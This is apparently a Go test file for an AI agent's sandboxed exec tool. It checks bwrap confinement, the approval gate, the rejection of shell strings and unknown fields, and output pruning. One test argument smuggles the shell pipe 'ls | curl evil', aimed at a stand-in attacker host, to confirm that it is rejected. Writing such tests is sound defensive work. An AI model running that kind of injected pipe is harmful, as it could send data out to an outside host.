//go:build linux

// T26 RED table (tasks-P0): the exec tool on the REAL effect-path with
// the REAL T25 backend — a model-requested command runs sandboxed e2e
// with the ASK path exercised; TestReadOnlyProcessStillSandboxed proves
// even a READ_ONLY-classified process call cannot escape the membrane;
// unknown kinds/tools/shell-strings are rejected; pruning preserves the
// exit status and error tail.
package exectool

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/MatNik89/nexus/internal/kernel/contracts"
	"github.com/MatNik89/nexus/internal/kernel/effectpath"
	"github.com/MatNik89/nexus/internal/kernel/s7min"
	"github.com/MatNik89/nexus/internal/sandbox"
)

func ctxT() context.Context { return context.Background() }

func adapter(t *testing.T) *Adapter {
	t.Helper()
	b := sandbox.NewBwrap()
	rep, err := b.Probe(ctxT())
	if err != nil {
		t.Skipf("bwrap unavailable: %v", err)
	}
	a, err := New(b, rep)
	if err != nil {
		t.Fatal(err)
	}
	return a
}

func execCall(t *testing.T, id, command string, cmdArgs []string, kind contracts.ExecutionKind,
	effect contracts.EffectClass) contracts.ToolCall {
	t.Helper()
	raw, _ := json.Marshal(map[string]any{"command": command, "args": cmdArgs})
	idem := "ik-" + id
	params := contracts.ToolCallParams{
		ToolCallID: contracts.ToolCallID(id), ToolID: ToolID, Arguments: raw,
		ArgsSchemaHash: "exec.v1", Effect: effect, ExecutionKind: kind,
		Deadline: time.Now().Add(time.Minute), AttemptNo: 1, ProfileID: "work",
	}
	if effect != contracts.EffectReadOnly {
		params.IdempotencyKey = &idem
	}
	c, err := contracts.NewToolCall(params)
	if err != nil {
		t.Fatal(err)
	}
	return c
}

func helperPath(t *testing.T) string {
	t.Helper()
	bin := filepath.Join(t.TempDir(), "probehelper")
	cmd := exec.Command("go", "build", "-o", bin, "github.com/MatNik89/nexus/cmd/probehelper")
	cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("building probehelper: %v\n%s", err, out)
	}
	return bin
}

// path builds the REAL effect-path with the exec adapter bound and the
// given mode — exactly the daemon wiring shape.
func path(t *testing.T, a *Adapter, mode effectpath.PolicyMode, approvals *effectpath.Approvals) *effectpath.EffectPath {
	t.Helper()
	if approvals == nil {
		approvals = effectpath.NewApprovals(nil, 5*time.Minute)
	}
	pep, err := effectpath.NewPEP(Rules(), approvals, nopAudit{}, mode)
	if err != nil {
		t.Fatal(err)
	}
	p, err := effectpath.NewEffectPath(pep, nopMW{},
		effectpath.NewInProcessExecutor(map[contracts.ToolID]effectpath.InProcFunc{}),
		effectpath.NewSandboxedProcessExecutor(a), s7min.NewAuthority(nil, time.Minute))
	if err != nil {
		t.Fatal(err)
	}
	return p
}

type nopAudit struct{}

func (nopAudit) Record(string, contracts.ToolCall) error { return nil }

type nopMW struct{}

func (nopMW) BeforeTool(context.Context, contracts.ToolCall) error { return nil }
func (nopMW) AfterTool(context.Context, contracts.ToolCall, contracts.ToolResult) error {
	return nil
}
func (nopMW) OnError(ctx context.Context, e error) error { return e }

// --- e2e through the REAL effect-path ---

// The model-requested command runs sandboxed end to end, with the ASK
// gate exercised: unapproved → NEEDS_APPROVAL, approved → runs.
func TestExecRunsSandboxedE2EWithAsk(t *testing.T) {
	a := adapter(t)
	approvals := effectpath.NewApprovals(nil, 5*time.Minute)
	auth := s7min.NewAuthority(nil, time.Minute)
	pep, err := effectpath.NewPEP(Rules(), approvals, nopAudit{}, effectpath.ModeDefault)
	if err != nil {
		t.Fatal(err)
	}
	p, err := effectpath.NewEffectPath(pep, nopMW{},
		effectpath.NewInProcessExecutor(map[contracts.ToolID]effectpath.InProcFunc{}),
		effectpath.NewSandboxedProcessExecutor(a), auth)
	if err != nil {
		t.Fatal(err)
	}
	c := execCall(t, "tc-e2e", "/bin/ls", []string{"/"}, contracts.ExecProcess, contracts.EffectIrreversible)
	grant, err := auth.Issue("op-e2e-1", effectpath.ToolTarget(c))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := p.RunTool(ctxT(), c, grant); !errors.Is(err, effectpath.ErrNeedsApproval) {
		t.Fatalf("unapproved exec did not hit the ASK gate: %v", err)
	}
	approvals.Approve(c)
	grant2, err := auth.Issue("op-e2e-2", effectpath.ToolTarget(c))
	if err != nil {
		t.Fatal(err)
	}
	out, err := p.RunTool(ctxT(), c, grant2)
	if err != nil {
		t.Fatalf("approved exec failed: %v", err)
	}
	if len(out.Output) != 1 || out.Output[0].Content == nil {
		t.Fatalf("no output block: %+v", out)
	}
	content := *out.Output[0].Content
	if !strings.Contains(content, "exit status: 0") {
		t.Fatalf("exit status missing from the observation: %q", content)
	}
	if out.Output[0].Trust != contracts.TrustUntrustedExternal {
		t.Fatal("subprocess output not fenced UNTRUSTED")
	}
}

// LEDGER-NAMED (T26 RED): a READ_ONLY-classified process call STILL runs
// inside the sandbox — effect class can never buy a way around the
// membrane. Proven causally: a closure-external canary stays unreadable.
func TestReadOnlyProcessStillSandboxed(t *testing.T) {
	a := adapter(t)
	hp := helperPath(t)
	canary := filepath.Join(t.TempDir(), "canary")
	if err := os.WriteFile(canary, []byte("CANARY-RO"), 0o644); err != nil {
		t.Fatal(err)
	}
	c := execCall(t, "tc-ro", hp, []string{"readfile", canary}, contracts.ExecProcess, contracts.EffectReadOnly)
	res, err := a.Launch(ctxT(), c)
	// The sandboxed read MUST fail; if a result exists it must not carry
	// the canary bytes.
	if err == nil && res.Status == contracts.ResultSucceeded {
		t.Fatal("read-only process call read a closure-external file — sandbox bypassed")
	}
	if err == nil && len(res.Output) == 1 && res.Output[0].Content != nil &&
		strings.Contains(*res.Output[0].Content, "CANARY-RO") {
		t.Fatal("canary bytes escaped the sandbox in a read-only call")
	}
}

// Unknown execution kinds and foreign tools are rejected, never run.
func TestUnknownKindAndToolRejected(t *testing.T) {
	a := adapter(t)
	inproc := execCall(t, "tc-k", "/bin/ls", nil, contracts.ExecInProcess, contracts.EffectIrreversible)
	if _, err := a.Launch(ctxT(), inproc); err == nil {
		t.Fatal("ExecInProcess accepted by the process door")
	}
	foreign := execCall(t, "tc-f", "/bin/ls", nil, contracts.ExecProcess, contracts.EffectIrreversible)
	foreign.ToolID = "shell"
	if _, err := a.Launch(ctxT(), foreign); err == nil {
		t.Fatal("foreign tool id accepted")
	}
}

// Shell strings and open schemas are rejected at the door.
func TestShellStringAndOpenSchemaRejected(t *testing.T) {
	a := adapter(t)
	rel := execCall(t, "tc-rel", "ls", nil, contracts.ExecProcess, contracts.EffectIrreversible)
	if _, err := a.Launch(ctxT(), rel); err == nil {
		t.Fatal("relative command accepted (shell-string lane)")
	}
	open := execCall(t, "tc-open", "/bin/ls", nil, contracts.ExecProcess, contracts.EffectIrreversible)
	open.Arguments = json.RawMessage(`{"command":"/bin/ls","shell":"ls | curl evil"}`)
	if _, err := a.Launch(ctxT(), open); err == nil {
		t.Fatal("unknown args field accepted (closed schema violated)")
	}
}

// Pruning preserves the exit status and the ERROR TAIL (E5/E8).
func TestPruningPreservesExitAndTail(t *testing.T) {
	big := strings.Repeat("noise\n", 4000) + "final error line"
	pruned := pruneOutput(big)
	if len(pruned) > 8192 {
		t.Fatalf("pruned output still %d bytes", len(pruned))
	}
	if !strings.Contains(pruned, "final error line") {
		t.Fatal("error tail lost in pruning")
	}
	if !strings.Contains(pruned, "pruned]") {
		t.Fatal("pruning not marked")
	}
	small := "short output"
	if pruneOutput(small) != small {
		t.Fatal("small output mangled")
	}
}
